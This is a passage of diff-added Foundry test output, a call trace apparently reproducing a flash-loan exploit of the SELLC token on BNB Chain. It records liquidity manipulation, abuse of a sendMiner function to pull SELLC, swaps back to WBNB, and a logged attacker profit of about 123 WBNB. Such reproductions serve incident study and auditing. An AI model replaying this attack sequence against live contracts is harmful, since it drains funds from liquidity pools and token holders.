+    │   │   │   │   ├─ [3627] SELLC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], 1438549060602166147816500 [1.438e24])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], value: 1438549060602166147816500 [1.438e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [10834] USDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], 190885354039 [1.908e11])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], value: 190885354039 [1.908e11])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007722244285896 [1.157e77])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [32938] SELLC_USDT::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 192813488930 [1.928e11]
+    │   │   │   │   │   ├─ [562] SELLC::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1453079859207018382105913 [1.453e24]
+    │   │   │   │   │   ├─ [354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x0ED943Ce24BaEBf257488771759F9BF482C39706, value: 1531552016921 [1.531e12])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 378822047009163734 [3.788e17])
+    │   │   │   │   │   ├─ emit Sync(reserve0: 192813488930 [1.928e11], reserve1: 1453079859207018382105913 [1.453e24])
+    │   │   │   │   │   ├─ emit Mint(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 190885354039 [1.908e11], amount1: 1438549060602166147816500 [1.438e24])
+    │   │   │   │   │   └─ ← [Return] 378822047009163734 [3.788e17]
+    │   │   │   │   └─ ← [Return] 1438549060602166147816500 [1.438e24], 190885354039 [1.908e11], 378822047009163734 [3.788e17]
+    │   │   │   ├─ [51451] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(400000000000000000000 [4e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686566267 [1.686e9])
+    │   │   │   │   ├─ [3425] WBNB::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x358EfC593134f99833C66894cCeCD41F550051b6, 400000000000000000000 [4e20])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 400000000000000000000 [4e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [562] SELLC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4967587850442647317215094 [4.967e24], 882022925232027846709 [8.82e20], 1686566267 [1.686e9]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1282022925232027846709 [1.282e21]
+    │   │   │   │   ├─ [38283] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(1547253771408977960856101 [1.547e24], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [23159] SELLC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1547253771408977960856101 [1.547e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1547253771408977960856101 [1.547e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [562] SELLC::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 3420334079033669356358993 [3.42e24]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1282022925232027846709 [1.282e21]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 3420334079033669356358993 [3.42e24], reserve1: 1282022925232027846709 [1.282e21])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 400000000000000000000 [4e20], amount0Out: 1547253771408977960856101 [1.547e24], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [562] SELLC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1547253771408977960856101 [1.547e24]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [73255] 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1::sendMiner(SELLC: [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4])
+    │   │   │   │   ├─ [9075] Router::getAmountsOut(100000000000000 [1e14], [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955, 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4]) [staticcall]
+    │   │   │   │   │   ├─ [893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 32985872312642991733769430 [3.298e25], 139883119034032543171044 [1.398e23], 1686479866 [1.686e9]
+    │   │   │   │   │   ├─ [893] SELLC_USDT::getReserves() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 192813488930 [1.928e11], 1453079859207018382105913 [1.453e24], 1686566267 [1.686e9]
+    │   │   │   │   │   └─ ← [Return] [100000000000000 [1e14], 23522071737900667 [2.352e16], 1453067918367736966237357 [1.453e24]]
+    │   │   │   │   ├─ [562] SELLC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1547253771408977960856101 [1.547e24]
+    │   │   │   │   ├─ [3259] SELLC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1453067918367736966237357 [1.453e24])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x84Be9475051a08ee5364fBA44De7FE83a5eCC4f1, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1453067918367736966237357 [1.453e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [537] SELLC_USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 378822048182111922 [3.788e17]
+    │   │   │   ├─ [71876] Router::removeLiquidity(SELLC: [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4], USDT: [0x55d398326f99059fF775485246999027B3197955], 378822048182111922 [3.788e17], 0, 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686566267 [1.686e9])
+    │   │   │   │   ├─ [27476] SELLC_USDT::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], 378822048182111922 [3.788e17])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], value: 378822048182111922 [3.788e17])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [42013] SELLC_USDT::burn(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 192813488930 [1.928e11]
+    │   │   │   │   │   ├─ [562] SELLC::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1453079859207018382105913 [1.453e24]
+    │   │   │   │   │   ├─ [354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
+    │   │   │   │   │   ├─ emit Transfer(from: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], to: 0x0000000000000000000000000000000000000000, value: 378822048182111922 [3.788e17])
+    │   │   │   │   │   ├─ [3271] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 190885354630 [1.908e11])
+    │   │   │   │   │   │   ├─ emit Transfer(from: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 190885354630 [1.908e11])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [3259] SELLC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1438549065056321759577635 [1.438e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1438549065056321759577635 [1.438e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1928134300 [1.928e9]
+    │   │   │   │   │   ├─ [562] SELLC::balanceOf(SELLC_USDT: [0x9523B023E1D2C490c65D26fad3691b024d0305D7]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14530794150696622528278 [1.453e22]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 1928134300 [1.928e9], reserve1: 14530794150696622528278 [1.453e22])
+    │   │   │   │   │   ├─ emit Burn(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0: 190885354630 [1.908e11], amount1: 1438549065056321759577635 [1.438e24], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Return] 190885354630 [1.908e11], 1438549065056321759577635 [1.438e24]
+    │   │   │   │   └─ ← [Return] 1438549065056321759577635 [1.438e24], 190885354630 [1.908e11]
+    │   │   │   ├─ [562] SELLC::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 4438870754833036686671093 [4.438e24]
+    │   │   │   ├─ [51578] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(4438870754833036686671093 [4.438e24], 0, [0xa645995e9801F2ca6e2361eDF4c2A138362BADe4, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1686566267 [1.686e9])
+    │   │   │   │   ├─ [3627] SELLC::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x358EfC593134f99833C66894cCeCD41F550051b6, 4438870754833036686671093 [4.438e24])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x358EfC593134f99833C66894cCeCD41F550051b6, value: 4438870754833036686671093 [4.438e24])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [893] 0x358EfC593134f99833C66894cCeCD41F550051b6::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3420334079033669356358993 [3.42e24], 1282022925232027846709 [1.282e21], 1686566267 [1.686e9]
+    │   │   │   │   ├─ [562] SELLC::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 7859204833866706043030086 [7.859e24]
+    │   │   │   │   ├─ [38286] 0x358EfC593134f99833C66894cCeCD41F550051b6::swap(0, 723296300556608510348 [7.232e20], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [23162] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 723296300556608510348 [7.232e20])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x358EfC593134f99833C66894cCeCD41F550051b6, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 723296300556608510348 [7.232e20])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [562] SELLC::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 7859204833866706043030086 [7.859e24]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x358EfC593134f99833C66894cCeCD41F550051b6) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 558726624675419336361 [5.587e20]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 7859204833866706043030086 [7.859e24], reserve1: 558726624675419336361 [5.587e20])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 4438870754833036686671093 [4.438e24], amount1In: 0, amount0Out: 0, amount1Out: 723296300556608510348 [7.232e20], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 723296300556608510348 [7.232e20]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [3262] WBNB::transfer(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476, 600000000000000000000 [6e20])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476, value: 600000000000000000000 [6e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [534] WBNB::balanceOf(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476) [staticcall]
+    │   │   │   └─ ← [Return] 620224049498839872504 [6.202e20]
+    │   │   ├─ [2531] USDT::balanceOf(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476) [staticcall]
+    │   │   │   └─ ← [Return] 80379956082056309384702 [8.037e22]
+    │   │   ├─ [534] WBNB::balanceOf(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476) [staticcall]
+    │   │   │   └─ ← [Return] 620224049498839872504 [6.202e20]
+    │   │   ├─ [531] USDT::balanceOf(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476) [staticcall]
+    │   │   │   └─ ← [Return] 80379956082056309384702 [8.037e22]
+    │   │   ├─ emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 600000000000000000000 [6e20], : 0)
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Return] 
+    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 123296300556608510348 [1.232e20]
+    ├─ [2444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 123296300556608510348 [1.232e20], decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 612.82ms (311.48ms CPU time)
+
+Ran 2 test suites in 615.18ms (891.37ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
